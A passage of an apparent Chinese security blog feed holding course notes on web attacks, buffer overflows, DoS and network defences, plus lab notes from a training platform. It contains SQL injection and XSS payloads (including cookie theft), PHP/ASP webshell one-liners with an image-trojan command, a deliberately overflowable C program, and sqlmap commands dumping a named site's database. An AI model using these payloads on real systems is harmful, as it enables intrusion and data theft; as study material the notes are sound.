title="SQL注入攻击原理"></a>SQL注入攻击原理</h2><ol><li><p>利用Web应用对后台<strong>数据库查询语句</strong>处理存在的安全漏洞，提交一段精心构造的数据库查询代码，根据返回结果获取数据。（受影响系统：<strong>输入参数不检查和过滤的系统</strong>）</p></li><li><p>注入方法:<br>布尔型、时间延迟、报错型、可联合查询、多语句查询注入等</p></li><li><p>GET:提交信息显示在URL</p></li><li>POST:不显示</li><li>注入过程<br>假设查询语句<br><code>select * from users where userID=&#39;$name&#39; and userPasswd=&#39;$passwd&#39;</code></li></ol><p>可闭合单引号进行绕过</p><p><code>admin/1234567&#39; or &#39;1&#39;=&#39;1</code>或<code>admin/1234567&#39; or &#39;1&#39;=&#39;1&#39;#</code>或<br><code>admin&#39; or &#39;1&#39;=&#39;1&#39;#/1234567</code></p><h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><p>复习盲注:<br>1.测试漏洞</p><pre><code>and 1=2,and 1=1;</code></pre><p>2.猜字段</p><pre><code>and exists(select * from admin);and exists(select id from admim);and exists(select username from admin);and exists(select passwd from admin);</code></pre><p>3.猜用户名和长度</p><pre><code>and exists(select id from admin where id=1);and exists(select id from admin where len(username)=5 and id=1);and exists(select id from admin where len(passwd)=10 and id=1)</code></pre><p>4.猜测用户名</p><pre><code>and 1=(select id from (select * from admin where id=1) where asc(mid(usernam,1,1))&lt;100)1=(select id from (select * from admin where id=1) where asc(mid(usernam,1,1))&lt;50)</code></pre><p>折半查找<br>    当&lt;变=可确定ascii对应的字符<br>    and 1=(select id from (select * from admin where id=1) where username=’admin’;</p><h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ol><li>使用预编译语句，绑定变量</li><li>用户提交的数据和输入参数进行严格过滤(,’;select delete from union 等)</li><li>摒弃动态SQL语句，改用存储过程来访问和操作数据</li><li>使用安全函数:OWASP、ESAPI</li><li>最小权限原则</li></ol><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>原理：<br>攻击者往Web页面里插入恶意html代码，当用户浏览该网页时，嵌入其中的恶意代码被执行，达到特殊目的。<br>分类</p><ul><li>反射型XSS：需要主动点击</li><li>存储式XSS：脚本永久存储目标服务器数据库或文件</li><li>DOM型XSS：客户端浏览器对请求页面进行DOM渲染(不需要服务器解析响应，浏览器DOM解析触发)</li></ul><p>举例：</p><pre><code>&lt;a href=&apos;&quot;+str+&quot;&apos;&gt;link&lt;/a&gt;构造 &apos;onclick=alert(&quot;xss&quot;)//构造 &apos;&gt;&lt;img src=# onerror=alert(&quot;xss&quot;)/&gt;&lt;&apos;</code></pre><p>发起条件：</p><ul><li>Web服务器允许用户在表格或编辑框中输入不相关<br>的字符</li><li>Web服务器存储并允许把用户输入显示在返回给终<br>端用户的页面上，而没有去除非法字符或者重新进行编码。</li></ul><p>跨站脚本攻击的两个条件：</p><ul><li>存在跨站脚本漏洞的web应用程序</li><li>用户点击连接或者访问某一页面</li></ul><h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><pre><code>&lt;a href&gt;=&quot;http://www.baidu.com&quot;&gt;baidu&lt;/A&gt;&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;&quot;</code></pre><p>cookie发送远程代码<br><code>javascript: window.location=&#39;link?&#39;+document.cookie</code></p><p>论坛管理员修改权限操作<br><code>admin_user.asp?&amp;username=xxx&amp;membercode=yyy</code><br>先获取管理员权限后构造<br><code>&lt;img src=window.location=&#39;http://127.0.0.1/admin_user.asp?&amp;username=xxx&amp;membercode=yyy&#39;&gt;</code></p><h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><ol><li>对用户来说，教育为主。<br>注意可疑链接，可装入一些浏览器插件如Firefox的NoScript</li><li>Web应用开发者</li></ol><ul><li>对所有用户提交内容进行可靠的输入验证(URL、POST数据)</li><li>保护所有敏感的功能，以防被机器人自动执行或被第三方网站执行。(session标记、验证码)</li></ul><p>其他Web攻击类型：<br>CSRF、失效的身份认证和会话管理、不安全对象的直接引用、安全配置错误、敏感信息泄露、</p><h1 id="第六章缓冲区溢出漏洞"><a href="#第六章缓冲区溢出漏洞" class="headerlink" title="第六章缓冲区溢出漏洞"></a>第六章缓冲区溢出漏洞</h1><h2 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h2><p>向固定长度的缓冲区中写入超出其预定长度的内容，造成缓冲区数据溢出，从而覆盖缓冲区周围的内存空间。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>程序在内存存放形式：一段连续的内存块，包括代码段、数据段和堆栈段。</p><ul><li>代码段(.text)：程序的机器码和只读数据，只读。</li><li>数据段:已初始化(.data)和未初始化(.bss),编译时分配</li><li>堆栈段：堆(Heap)+栈(Stack)<br>堆：大小不固定，可动态扩张/缩减。堆内存释放由应用程序控制。<br>栈：运行时按需分配，先进后出。PUSH压栈，POP出栈。</li></ul><p>堆栈区别：</p><ul><li>分配和管理方式不同</li><li>产生碎片不同</li><li>生长方向不同</li></ul><ol><li>file offset:数据在PE文件中相对文件开头的偏移</li><li>Image Base:PE文件装入虚拟内存基地址</li><li>VA:PE文件指令被装入虚拟内存后的地址</li><li>RVA：VA相对于基址的偏移量</li><li>VA=Image Base + RVA</li></ol><p><code>file offset = RVA - section offset= VA - Image base - section offset</code></p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出:"></a>栈溢出:</h2><p>ESP(extended stack pointer)：系统栈最上面栈帧的栈顶<br>EBP：系统栈最上面栈帧的栈底<br>EIP：指向下一条等待执行的指令地址</p><p>函数调用参数入栈顺序：<br>VC —_cdecl方式(由右至左) </p><p>函数入栈步骤：<br>参数入栈、返回地址入栈、代码区跳转、栈帧调整。</p><p>调用指令：</p><pre><code>push 参数2push 参数1call 函数地址(保存返回地址；跳转到调用函数入口)push ebp;move ebp,espsub esp,xxx 分配XXX字节栈区空间</code></pre><p>overflow基于下图去理解<br>代码如下：</p><pre><code>#include &lt;stdio.h&gt;#include&lt;string.h&gt;#define PASSWORD &quot;1234567&quot;int verify_password(char *password){int authenticated;char buffer[8];authenticated=strcmp(password,PASSWORD);strcpy(buffer,password);return authenticated;    }main(){int valid_flag=0;char password[1024];while(1){    printf(&quot;please input password:      &quot;);    scanf(&quot;%s&quot;,password);    valid_flag=verify_password(password);    if(valid_flag)    {        printf(&quot;incorrect password!\n\n&quot;);    }else    {        printf(&quot;Congratulation! You have passed the verification!\n&quot;);        break;    }}}</code></pre><p><img src="https://i.imgur.com/padWTTf.png" alt=""><br>overflow1:小于7个字符时，authenticated值为-1，补码表示0xffffffff,输入字符超过7个字符，authenticated值最低位恰好被覆盖为0，通过验证。<br>程序会崩溃。<br><img src="https://i.imgur.com/I70no6J.png" alt=""></p><p>overflow2:将返回地址覆盖成验证通过的0x00401122,password文本输入，UltraEdit编辑，倒着输入0x00401122,通过验证，程序崩溃。</p><p>原因:<br><strong>EBP被覆盖为无效值，程序在退出时堆栈无法平衡，导致崩溃。</strong></p><h2 id="缓冲区溢出攻击的基本类型："><a href="#缓冲区溢出攻击的基本类型：" class="headerlink" title="缓冲区溢出攻击的基本类型："></a>缓冲区溢出攻击的基本类型：</h2><ul><li>栈溢出</li><li>堆溢出</li><li>BSS溢出</li><li>格式化串溢出</li><li>整数溢出</li></ul><h2 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h2><ol><li>避免源码中的相关bug（）</li><li>插入代码进行数组边界检查、 返回指针完整性检查</li><li>阻止攻击代码执行(非执行缓冲区技术、堆栈数据段不可执行)</li><li>加强系统防护（GS机制、SafeSEH、DEP）</li></ol><h1 id="第七章拒绝服务"><a href="#第七章拒绝服务" class="headerlink" title="第七章拒绝服务"></a>第七章拒绝服务</h1><h2 id="0x01-DOS攻击"><a href="#0x01-DOS攻击" class="headerlink" title="0x01 DOS攻击"></a>0x01 DOS攻击</h2><ol><li>概念：破坏性攻击，通过消耗可用系统资源、带宽资源或造成程序缓冲区溢出错误，致使系统无法正常服务。</li><li>类型:网络带宽攻击、连通性攻击、滥用合理的服务请求、利用传输协议缺陷、利用服务程序的漏洞</li></ol><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>1.Ping of Death</p><p>缓存溢出： ping -l 65540 192.168.1.140</p><p>2.泪滴（Teardrop）</p><p>分片攻击，数据分片后传送到目标主机后再到堆栈中进行重组。</p><p>3.泛洪类（Flood）<br>UDP泛洪： 利用主机自动回复的服务(echo、chargen),一方的输出成为另一方的输入。</p><pre><code>SYN泛洪：利用TCP协议缺陷，发送大量伪造的TCP连接请求。ACK泛洪Connection泛洪HTTP Get 泛洪</code></pre><p>4.Land攻击(源地址和目标地址相同)<br>5.Smurf攻击(源为攻击主机地址，目的为广播地址，ICMP )<br>6.Fraggle攻击(Smurf区别为UDP)<br>7.畸形消息攻击<br>8.Slashdot effect<br>9.WinNuke攻击（攻击目标端口）  </p><h2 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h2><p>SYN防御：缩短SYN Timeout时间、设置SYN Cookie、负反馈策略、退让策略、退让策略、 防火墙</p><p>拒绝服务攻击的防御困难之处——不容易定位攻击者。</p><p>防御方法： 有效完善的设计、带宽限制、及时给系统安装补丁、运行尽可能少的服务、只允许必要的通信、封锁敌意IP地址</p><h2 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h2><p>DDOS原理：通过控制分布在网络各处的数百甚至数万台傀儡主机（肉机），<br>发动它们同时向攻击目标进行DoS攻击。</p><h1 id="第八章身份认证"><a href="#第八章身份认证" class="headerlink" title="第八章身份认证"></a>第八章身份认证</h1><h2 id="AAA"><a href="#AAA" class="headerlink" title="AAA"></a>AAA</h2><ul><li>认证：在做任何动作之前必须要识别动作执行者的真实身份。又称为鉴别、确认。</li><li>授权：用户身份被确认合法后，赋予该用户进行文件和数据等的操作权限</li><li>审计/记账：每一个人都应该为自己所做的操作负责，所以在做完<br>事情之后都要留下记录，以便核查责任</li></ul><h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><ul><li>简单口令认证</li><li>基于单向函数的口令认证</li></ul><ul><li>一次性口令认证<br>防止重放攻击；基于客户端/服务器模式；</li></ul><ol><li>连接请求</li><li>返回seed,seq(服务器seq-1)</li><li>输入口令，口令+seed做seq次hash；</li><li>服务器存储用户上次登录得一次性口令，hash依次比较，一致通过，覆盖口令</li></ol><h1 id="第九章VPN"><a href="#第九章VPN" class="headerlink" title="第九章VPN"></a>第九章VPN</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>VPN是在公共网络上传输私有通信的方法。VPN通常使用（加密的）隧道将两个或多个专用网络连接起来。</p><h2 id="层次和类型"><a href="#层次和类型" class="headerlink" title="层次和类型"></a>层次和类型</h2><p><img src="https://i.imgur.com/C8f4S3m.png" alt=""></p><h2 id="隧道协议"><a href="#隧道协议" class="headerlink" title="隧道协议"></a>隧道协议</h2><p><img src="https://i.imgur.com/dJouaKB.png" alt=""><br><img src="https://i.imgur.com/G8bPgEX.png" alt=""></p><h2 id="IPSec"><a href="#IPSec" class="headerlink" title="IPSec"></a>IPSec</h2><p>概念：用于构建VPN的一系列协议。为提供加密安全服务而开发，支持认证、完整性、访问控制以及数据一致性。只允许IP数据的封装和加密。</p><p>组成：</p><ul><li>Internet密钥交换协议（IKE）</li><li>封装协议<ol><li>负载安全封装</li><li>认证报头协议<br><img src="https://i.imgur.com/ZdSOJCX.png" alt=""></li></ol></li></ul><h1 id="第十章防火墙"><a href="#第十章防火墙" class="headerlink" title="第十章防火墙"></a>第十章防火墙</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul><li>防火墙(firewall)是位于两个(或<br>多个)网络间实施网间访问控制的组件的集合</li><li><p>防火墙通常是单独的计算机、路由器或专有硬件设备，充当访问网络的唯一入口点</p></li><li><p>防火墙实现数据流控制通过预先设定安全规则来实现，安全规则由匹配条件和处理方式两部分组成。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>使用对象分类:</p></li><li><p>个人防火墙</p></li><li><p>企业防火墙<br>技术分类：</p></li><li><p>包过滤防火墙(静态包和动态包)</p></li><li>代理技术（应用层代理和电路级网关）</li><li>混和型防火墙</li></ul><hr><p>后续实践</p><h1 id="扫描-1"><a href="#扫描-1" class="headerlink" title="扫描"></a>扫描</h1><p>whois 163.com</p><p>nslookup<br>server dns.cumt.edu.cn   //指定域名服务器<br>set class=any  //设置类型<br>cs.cumt.edu.cn //查询主机host</p><p>dig 163.com    //域名解析</p><p>firece dns cumt.edu.cn   //dns扫描</p><p>host 163.com  //  ip-主机名</p><p>tracert 163.com    //路由追踪</p><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><pre><code>nmap -sP 目标阻断ICMP包可换 TCP进行ping  nmap -PT 80</code></pre><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>主动连接目标系统的TCP和UDP端口以确定哪些服务正在运行或处于LISTENING（监听）状态。</p><pre><code>- TCP Connect()扫描;nmap -sT- TCP SYN扫描(半开扫描;nmap -sS)：向目标端口送SYN数据包 - TCP FIN扫描(秘密扫描;nmap -sF): 向目标端口发送FIN数据包(-xX -sN)- TCP ACK扫描(nmap -sA),测试防火墙的规则集, 不能用来确定端口是否开放或者关闭- TCP窗口扫描(nmap -sW): 测试特定目标系统（如AIX和FreeBSD系统）上的端口是否开放、被过滤- TCP Maimon扫描(nmap -sM) ：探测报文改为FIN/ACK外，其原理与TCP FIN扫描一样；无论端口是否开放，都应响应RST报文-  UDP扫描(nmap -sU) ：向目标端口发出UDP数据包-  激进扫描 ： nmap –A 控制时间：nmap –T(0-5) </code></pre><h2 id="旗标抓取-1"><a href="#旗标抓取-1" class="headerlink" title="旗标抓取"></a>旗标抓取</h2><pre><code>telnet www.cumt.edu.cn 80nc -v 163.com 80</code></pre><h3 id="密码修改"><a href="#密码修改" class="headerlink" title="密码修改"></a>密码修改</h3><pre><code>su su -passwd</code></pre><h3 id="修改文件权限："><a href="#修改文件权限：" class="headerlink" title="修改文件权限："></a>修改文件权限：</h3><pre><code>chmod 777 file/chmod a=rwx file  chmod ug=rwx,o=x file/chmod 771 file  </code></pre><p>若要rwx属性则4+2+1=7；<br>若要rw-属性则4+2=6；<br>若要r-x属性则4+1=5。</p><h3 id="修改用户账户"><a href="#修改用户账户" class="headerlink" title="修改用户账户"></a>修改用户账户</h3><pre><code>usermod [-LU][-c &lt;备注&gt;][-d &lt;登入目录&gt;][-e &lt;有效期限&gt;][-f &lt;缓冲天数&gt;][-g &lt;群组&gt;][-G &lt;群组&gt;][-l &lt;帐号名称&gt;][-s &lt;shell&gt;][-u &lt;uid&gt;][用户帐号]</code></pre><p>更改登录目录</p><pre><code>usermod -d /home/hnlinux root</code></pre><p>改变用户的uid</p><pre><code>usermod -u 777 root</code></pre><h1 id="欺骗"><a href="#欺骗" class="headerlink" title="欺骗"></a>欺骗</h1><pre><code>arp -a //缓存表arp -s 192.168.1.254 00-0f-7a-02-00-4b //设置静态</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概论&quot;&gt;&lt;a href=&quot;#概论&quot; class=&quot;headerlink&quot; title=&quot;概论&quot;&gt;&lt;/a&gt;概论&lt;/h1&gt;&lt;h2 id=&quot;安全主要威胁&quot;&gt;&lt;a href=&quot;#安全主要威胁&quot; class=&quot;headerlink&quot; title=&quot;安全主要威胁&quot;&gt;&lt;/a&gt;安
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>墨者学院</title>
    <link href="http://yoursite.com/2018/10/29/%E5%A2%A8%E8%80%85/"/>
    <id>http://yoursite.com/2018/10/29/墨者/</id>
    <published>2018-10-28T16:00:00.000Z</published>
    <updated>2018-12-23T04:29:11.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SVN信息漏洞"><a href="#SVN信息漏洞" class="headerlink" title="SVN信息漏洞"></a>SVN信息漏洞</h1><p>Subversion</p><p>URL后面加.svn/entries访问，如存在漏洞可显示成功</p><p>svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，目录内容有wc.db文件管理。查看内容</p><h1 id="Web文件上传漏洞"><a href="#Web文件上传漏洞" class="headerlink" title="Web文件上传漏洞"></a>Web文件上传漏洞</h1><ul><li>0X00截断漏洞(<a href="http://xx/upfiles/lubr.php.jpg" target="_blank" rel="noopener">http://xx/upfiles/lubr.php.jpg</a> “.”换成0X00，“.”的ASII码值为0x2e)    </li><li>构造服务器端扩展名检测上传（lubr.php改成lubr.php.abc）    </li><li>绕过Content-Type检测文件类型上传(修改符合白名单)    </li><li>构造图片木马，绕过文件内容检测上传Shell（文件内容验证    getimeagesize()，制作图片马  copy 1.jpg/b+2.php/a 3.jpg）    </li></ul><p>php： &lt;?php @eval($_POST[‘chopper’]);?&gt;<br>asp:  &lt;eval request(“pass”)%&gt;<br>aspx  &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p><h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><p><strong>注入技术：盲推理SQL注入，UNION查询SQL注入，堆查询和基于时间的SQL盲注入</strong></p><p>检查注入点<br>sqlmap.py -u “<a href="http://www.scshlx.com/TeachView.asp?id=21&quot;" target="_blank" rel="noopener">http://www.scshlx.com/TeachView.asp?id=21&quot;</a><br>列数据库/表<br>sqlmap -u “” –dbs/–tables/<br>列字段<br>sqlmap -u “” -T “指定表名admin” –columns<br>指定库表段列出内容<br>sqlmap -u “” –dump -T “admin” -C “username,password”<br>查询所有字段<br>sqlmap -u “” –tables –columns<br>mysql注入<br>–dbs –current-db –users –current-user –tables-D<br>-T””-D””–colums    </p><p>脱裤<br>-dump-all    </p><h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>‘ /and 1=1/and 1=2猜注入点<br>and exists(select * from admin)猜表名<br>and exists(select admin from admin)猜列名<br>and(select top 1 len(admin) from admin &gt;1))猜字段长度<br>and(select top 1 asc(mid(admin,1,1)) from admin&gt;97)猜字段字符ASII    </p><p>union 手工，先order by 1++;猜字段长度。<br>select 1,2…. from admin 猜字段编号<br>select 1,admin,password,… 爆名和密码    </p><p>@@global.version_compile_os from mysql.user() – 猜os<br>1’ and 1=2 union select 1,schema_name from information_schema.schemata – 爆所有库名    </p><p>预防数据库攻击<br>mysql_real_escape_string()转义字符串中的特殊字符<br>stripslashes($value)去除斜杠<br>is_numeric($id)检查id是否为数字    </p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>利普通用户XSS存储实现创建管理员账户的CSRF利用    </p><h1 id="数据库备份拿webshell"><a href="#数据库备份拿webshell" class="headerlink" title="数据库备份拿webshell"></a>数据库备份拿webshell</h1><h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><ul><li>IIS 6.0    </li></ul><ul><li>目录解析 x.com/x.asp/x.jpg 默认把.asp，.asp目录下文件解析成asp文件    </li><li><p>文件解析 x.com/x.asp;.jpg默认不解析;后面内容    </p></li><li><p>默认可执行<br>test.asa/test.cer/test.cdx    </p></li></ul><ul><li>Apache<br>从右至左判断，后缀名无法判断往左判断。test.php.awe.asd会解析php文件<br>形式 xx.com/test.php.php123<br>其他漏洞：<br>conf配置AddHandler php5-script .php 文件名只要包含.php会以php执行    </li></ul><p>AddType application/x-httpd-php .jpg 会以jpg执行    </p><ul><li>IIS7.X(x自定义，只能执行php)    </li></ul><p>正常命名：<a href="http://www.xxx.com/logo.jpg" target="_blank" rel="noopener">www.xxx.com/logo.jpg</a>    </p><p>触发解析漏洞命名：<a href="http://www.xxx.com/logo.jpg/x.php" target="_blank" rel="noopener">www.xxx.com/logo.jpg/x.php</a>    </p><ol><li>Nginx同iis7.x一致    </li></ol><h1 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h1><p>如果碰到getimagesize()函数检测，判断文件是否为有效文件图片。<br>copy a.jpg/b + b.php/a PicLubr.jpg </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SVN信息漏洞&quot;&gt;&lt;a href=&quot;#SVN信息漏洞&quot; class=&quot;headerlink&quot; title=&quot;SVN信息漏洞&quot;&gt;&lt;/a&gt;SVN信息漏洞&lt;/h1&gt;&lt;p&gt;Subversion&lt;/p&gt;
&lt;p&gt;URL后面加.svn/entries访问，如存在漏洞可显示成功&lt;
      
    
    </summary>
    
    
  </entry>
  
</feed>
